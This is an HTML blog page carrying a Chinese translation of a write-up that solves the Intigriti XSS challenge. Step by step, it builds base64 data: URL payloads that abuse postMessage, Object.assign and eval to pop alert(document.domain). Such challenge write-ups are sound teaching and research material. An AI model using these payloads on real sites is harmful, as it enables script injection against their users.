@@ -1,0 +1,2101 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="damn1t">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="damn1t">
+    <meta name="keywords" content="damn1t | damn1t">
+    <meta name="description" content="404">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Intigriti XSS Challenge - Solution and problem solving approach · Damn World</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+        
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/Spson.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >damn guys</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Intigriti XSS Challenge - Solution and problem solving approach</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>damn guys</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/page.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Intigriti XSS Challenge - Solution and problem solving approach
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "xss">xss</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2019/05/09</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Intigriti-XSS-Challenge-Solution-and-problem-solving-approach"><a href="#Intigriti-XSS-Challenge-Solution-and-problem-solving-approach" class="headerlink" title="Intigriti XSS Challenge - Solution and problem solving approach"></a>Intigriti XSS Challenge - Solution and problem solving approach</h1><p><strong>原文链接：</strong><a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p>
+<p>这是基于chrome的漏洞，但是google确实🐮🍺，反应速度极快，我准备复现的时候已经修复了，不过我在ipad上的Google浏览器实验时成功了</p>
+<p>Intigriti发布了一个有趣的小XSS挑战，它要求创建一个特殊的URL，既可以用来分配iframe的SRC，也可以发送到一个eval调用来弹出一个警报（document.domain），这是挑战的目标。但是我们如何实现？让我们回到开始，一步步分析。</p>
+<p>注意：最终漏洞仅适用于Chrome，因此如果您想要跟进，我建议您使用chrome。</p>
+<p>主要代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  const url = new URL(decodeURIComponent(document.location.hash.substr(1))).href.replace(/script|&lt;|&gt;/gi, &quot;forbidden&quot;);#document.location.hash打印出‘#’后的内容</span><br><span class="line">  const iframe = document.createElement(&quot;iframe&quot;); iframe.src = url; document.body.appendChild(iframe);</span><br><span class="line">  iframe.onload = function()&#123; window.addEventListener(&quot;message&quot;, executeCtx, false);&#125;</span><br><span class="line">  function executeCtx(e) &#123;</span><br><span class="line">    if(e.source == iframe.contentWindow)&#123;</span><br><span class="line">      e.data.location = window.location;</span><br><span class="line">      Object.assign(window, e.data);</span><br><span class="line">      eval(url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
+<li>代码获取hash当前页面的url（＃后面的任何内容），从中解码URL实体，然后用字符串“forbidden”替换“script”，“&lt;”或“&gt;”的任何实例。结果分配给url变量</li>
+<li>iframe是在当前页面创建，其src是url刚刚创建，有效地加载一个URL到iframe</li>
+<li>当iframe完成加载时，我们开始监听message事件并executeCtx在提出时甚至调用</li>
+<li>该executeCtx功能已定义</li>
+</ol>
+<ul>
+<li><p>该功能确保事件来自 iframe</p>
+</li>
+<li><p>本次活动的有效载荷的location属性写入当前windows的location，大概是为了再次保护重定向另一个URL</p>
+</li>
+<li><p>有效载荷对象中的每个属性都分配给window带有Object.assign(window, e.data)行（这意味着我发送的任何内容executeCtx都将在window…中定义…非常有趣）</p>
+</li>
+<li><p>url变量被eval</p>
+</li>
+</ul>
+<p>阅读完该代码后，我的第一个问题是：<code>message</code>事件是什么？事实证明，有一个用于跨源通信的API <code>window.postMessage</code>，它允许您将对象发送给收听该<code>message</code>事件的任何人。</p>
+<h2 id="一步一步的利用"><a href="#一步一步的利用" class="headerlink" title="一步一步的利用"></a>一步一步的利用</h2><p>绕过过滤，尝试利用base64<br><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=，这是base64" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=，这是base64</a> for <code>&lt;script&gt;alert(&#39;hi&#39;);&lt;/script&gt;</code>，我得到了我的<code>alert！</code>但是<code>alert(document.domain)</code>从内部不起作用，iframe因为它是一个数据URL，并且没有域。我们有一个alert盒子，但我想从外面弹出它，所以我远远没有结束。</p>
+<p>Posting a message to the parent window</p>
+<p>我们的目标是执行<code>eval（url）</code>，我现在需要去post一个message从而执行<code>executeCtx</code>函数。所以我尝试刚了解到的这个api并使用以下脚本：<code>&lt;script&gt;window.postMessage(&quot;test&quot;, &quot;*&quot;)&lt;/script&gt;</code>，<code>postMessage</code>函数的第二个参数是目标源，我明白使用<code>&#39;*&#39;</code>是一个坏的尝试，因为它允许任何人可以截断我的message但是我并不在意毕竟这只是个挑战，所以结果就是构造了如下的url：</p>
+<blockquote>
+<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+</a></p>
+</blockquote>
+<p>啥都没有。我在<code>executeCtx</code>下了断点但似乎没有命中。让我们回到<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">MDN</a>了解<code>postMessage</code>函数是如何调用的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">targetWindow.postMessage(message, targetOrigin, [transfer]);</span><br><span class="line"></span><br><span class="line">targetWindow</span><br><span class="line">A reference to the window that will receive the message. Methods for obtaining such a reference include:</span><br><span class="line">- window.open (to spawn a new window and then reference it),</span><br><span class="line">- window.opener (to reference the window that spawned this one),</span><br><span class="line">- HTMLIFrameElement.contentWindow (to reference an embedded &lt;iframefrom its parent window),</span><br><span class="line">- window.parent (to reference the parent </span><br><span class="line">window from within an embedded &lt;iframe&gt;), or</span><br><span class="line">- window.frames + an index value (named or numeric).</span><br></pre></td></tr></table></figure></p>
+<p>所以<code>postMessage</code>必须在window能够接收message的情况下被调用。于是调整我们的payload：<code>&lt;script&gt;window.parent.postMessage(&quot;test&quot;, &quot;*&quot;)&lt;/script&gt;</code>。我想要message能够被主视窗接收，所以<code>iframe</code>就是<code>windows.parent</code>，新的url如下：</p>
+<blockquote>
+<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg</a></p>
+</blockquote>
+<p>好的！现在我得到了一个来自<code>executeCtx</code>的js错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(index):31 Uncaught TypeError: Failed to set an indexed property on &apos;Window&apos;: Index property setter is not supported.</span><br><span class="line">    at Function.assign (&lt;anonymous&gt;)</span><br><span class="line">    at executeCtx ((index):31)</span><br></pre></td></tr></table></figure></p>
+<p>这是因为数据是一个字符串所以我们遇到了<code>Object.assign(window, e.data);</code>问题。让我们先发送一个空对象。payload如下：<code>&lt;script&gt;window.parent.postMessage({}, &quot;*&quot;)&lt;/script&gt;</code>，转换为url如下：</p>
+<blockquote>
+<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+</a></p>
+</blockquote>
+<p>结果是<code>Uncaught SyntaxError: Unexpected end of input</code>由<code>eval(url)</code>这一行抛出。所以如下的值<code>data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+</code>是无法去解析url变量中的有效js。</p>
+<h2 id="将url转为js"><a href="#将url转为js" class="headerlink" title="将url转为js"></a>将url转为js</h2><p>现在我们的目标是让<code>eval(url)</code>解析有效的js（还没到思考xss的时候）。我知道有很多东西都能作为有效的js所以我跳出这个挑战尝试运行：<code>eval(&#39;data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+&#39;)</code>在我的控制台。如期望一样发生了相同的错误。“Unexpected end of input” 意味着解析器期望另一个token但已经到达了字符串的末尾。我的url是以<code>+</code>结束，对于JS的表达式而言它没有什么实际意义，所以让我们将他剔除。这会让我们的base64字符串无效但我们之后会回到这个地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ&apos;)</span><br><span class="line">VM42:1 Uncaught ReferenceError: text is not defined</span><br><span class="line">    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:6)</span><br><span class="line">    at &lt;anonymous&gt;:1:1</span><br></pre></td></tr></table></figure></p>
+<p>什么？<code>text</code> is not defined？起先我不知道<code>text</code>来自于哪儿，但我回看的时候。。。好吧。然后我令<code>text=1</code>再次执行<code>eval</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; text = 1</span><br><span class="line">1</span><br><span class="line">&gt; eval(&apos;data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ&apos;)</span><br><span class="line">VM70:1 Uncaught ReferenceError: html is not defined</span><br><span class="line">    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:11)</span><br><span class="line">    at &lt;anonymous&gt;:1:1</span><br></pre></td></tr></table></figure></p>
+<p>哦！<code>html</code>？对了！url未带<code>+</code>结束是一个有效的JS。还是不懂？下面是url缩进之后：</p>
+<blockquote>
+<p>data: // a label for a goto</p>
+<p>text/html; // divides the variable text by the variable html</p>
+<p>base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ // evalutes the base64 variable and the PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ variable then returns the latter (see , operator)</p>
+</blockquote>
+<p>它肯定不是连贯的代码，但它是有效的JavaScript代码。字符串末尾的<code>+</code>只是一个简单的base64组件。我不断改进我的payload，只要遇到<code>+</code>则将他丢进垃圾桶直到以字母为结尾的base64编码能够是他成为有效的变量名</p>
+<h2 id="最后考虑XSS"><a href="#最后考虑XSS" class="headerlink" title="最后考虑XSS"></a>最后考虑XSS</h2><p>所以如何让<code>eval</code>执行js呢，如何放入<code>alert(document.domain)</code>？我们回到<a href="https://developer.mozilla.org/" target="_blank" rel="noopener">MDN</a>了解data协议并寻找哪里能放入我的<code>alert</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">The mediatype is a MIME type string, such as &apos;image/jpeg&apos; for a JPEG image file. If omitted, defaults to text/plain;charset=US-ASCII</span><br></pre></td></tr></table></figure></p>
+<p><code>; charset = US-ASCII</code>引起了我的注意。也许我可以把我的有效载荷放在那里？它甚至看起来像一个JavaScript变量赋值！所以我在我的控制台中尝试这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; text = 1</span><br><span class="line">1</span><br><span class="line">&gt; html = 1</span><br><span class="line">1</span><br><span class="line">&gt; eval(&apos;data:text/html;charset=alert(1);base64,whatever&apos;)</span><br><span class="line">Uncaught ReferenceError: base64 is not defined</span><br><span class="line">    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:33)</span><br><span class="line">    at &lt;anonymous&gt;:1:1</span><br></pre></td></tr></table></figure></p>
+<p>是的！<code>alert</code>成功pop了！虽然它抱怨base64没有被定义但是alert成功了那么又何必在意呢？是时候转向网站了！我更改我的payload为<code>&lt;script&gt;window.parent.postMessage({text:1, html:1, base64:1}, &quot;*&quot;)&lt;/script&gt;hi intigriti</code>记住<code>Object.assign(window, e.data)</code>这行将携带我post的message从而对<code>text</code>和<code>html</code>变量进行定义（我定义了base64但那不重要），末尾的<code>hi intigriti</code>可以逃离base64编码造成的末尾<code>+</code>存在。<br>于是url变为：</p>
+<blockquote>
+<p><a href="https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
+</blockquote>
+<p>但是。。。并没有奏效<br>data URLs最棒的一点就是你可以将他们放在你的地址栏然后查看结果，这一data URL：</p>
+<blockquote>
+<p>data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</p>
+</blockquote>
+<p>回显的信息是“This site can’t be reached”，研究了一阵我发现<code>alert(1)</code>的括号搞砸了这一切</p>
+<h2 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h2><p>我花了大量的时间努力寻求不需要括号去调用函数的可替代方式直到我发现或许我并不需要<code>charset=</code>，或许移除它就能绕过破坏我url的字符验证。现在尝试：</p>
+<blockquote>
+<p><a href="https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
+</blockquote>
+<p><code>alert(1)</code>成功了！，最后稍微调整一下</p>
+<blockquote>
+<p><a href="https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
+</blockquote>
+<p><img src="https://dee-see.github.io/images/intigriti_xss_victory.png" alt=""></p>
+<p><strong>注意</strong>：早上我升级了我的chrome，上述的方法100%不奏效了。我并没有额外的测试但我认为是因为<code>iframe</code>是在<code>message</code>事件监听被启用前调用的。所以添加一个<code>setTimeout</code>去延迟<code>postMessage</code>调用可能会修复这个问题，这一建议由<a href="https://twitter.com/ephreet1/status/1124220724770738176" target="_blank" rel="noopener">@ephreet</a>.提出</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为xss挑战，这有大量的代码审计。下面就是我的主要步骤：</p>
+<ul>
+<li>理解代码是如何运行的将有很大帮助</li>
+<li>不要过多关注目标，而是要有计划的针对中间步骤</li>
+<li>当你对要解决的挑战手足无措时不要紧张，解决好每一步，答案便会逐渐清晰</li>
+</ul>
+<p>谢谢<a href="https://twitter.com/intigriti/" target="_blank" rel="noopener">@intigriti</a>我玩得很开心！恭喜大家，祝你们好运！</p>
+<h2 id="什么是data-url-schema"><a href="#什么是data-url-schema" class="headerlink" title="什么是data url schema"></a>什么是data url schema</h2><p>data URI scheme 允许我们使用内联（inline-code）的方式在网页中包含数据，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。常用于将图片嵌入网页。</p>
+<h3 id="Data-URI的格式规范"><a href="#Data-URI的格式规范" class="headerlink" title="Data URI的格式规范,"></a>Data URI的格式规范,</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;&lt;encoding&gt;],&lt;encoded data&gt;</span><br><span class="line"></span><br><span class="line">1.  data ：协议名称；</span><br><span class="line"></span><br><span class="line">2.  [&lt;mime type&gt;] ：可选项，数据类型（image/png、text/plain等）</span><br><span class="line"></span><br><span class="line">3.  [;charset=&lt;charset&gt;] ：可选项，源文本的字符集编码方式</span><br><span class="line"></span><br><span class="line">4.  [;&lt;encoding&gt;] ：数据编码方式（默认US-ASCII，BASE64两种）</span><br><span class="line"></span><br><span class="line">5.  ,&lt;encoded data&gt; ：编码后的数据</span><br></pre></td></tr></table></figure>
